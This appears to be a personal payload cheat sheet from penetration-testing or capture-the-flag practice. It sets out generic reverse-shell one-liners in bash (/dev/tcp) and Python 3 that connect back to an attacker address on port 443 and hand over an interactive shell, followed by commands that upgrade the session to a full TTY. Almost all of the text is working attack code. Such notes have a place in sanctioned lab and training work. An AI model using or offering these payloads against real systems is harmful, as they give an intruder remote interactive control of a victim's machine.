# Payloads

Reverse shells, bind shells, one-liners, and snippets constantly used. Kept them
generic here. Box-specific payloads live in the box notes.

## Reverse shells
```bash
# bash
bash -i >& /dev/tcp/10.10.14.1/443 0>&1

# python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.1",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh","-i"])'
```

## Upgrade to a TTY
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# then: Ctrl-Z; stty raw -echo; fg; export TERM=xterm
```